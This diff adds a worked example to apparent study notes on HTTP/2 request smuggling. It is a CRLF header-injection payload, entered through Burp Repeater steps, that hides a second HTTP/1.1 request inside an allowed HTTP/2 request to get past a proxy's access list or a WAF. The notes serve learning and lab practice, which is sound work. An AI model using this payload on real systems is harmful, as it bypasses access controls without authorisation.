@@ -42,3 +42,20 @@
 
 ### Another way to understand the attack, would be to say that we are using an allowed resource, in this case /hello, to smuggle a request to a forbidden resource, in this case /admin. From the point of view of the proxy, only a request for /hello was made, so no violations to the ACL were made. It is important to note that the resource we request via HTTP/2 must be allowed by the ACL for this attack to work. We are effectively smuggling an invalid request over a valid one. This same method can sometimes be used to smuggle request past Web Application Firewalls (WAF).
 
+### Example:
+
+POST /legit HTTP/2
+Host: IP_ADDRESS:PORT
+User-Agent: Mozilla/5.0
+Foo: bar
+
+#### Send request through repeater
+
+#### Edit the Foo header from the inspector tab
+
+bar\r\n
+Host: IP_ADDRESS:PORT\r\n
+Content-Length: 0\r\n
+\r\n
+GET /smuggled HTTP/1.1\r\n
+X-Fake: a 
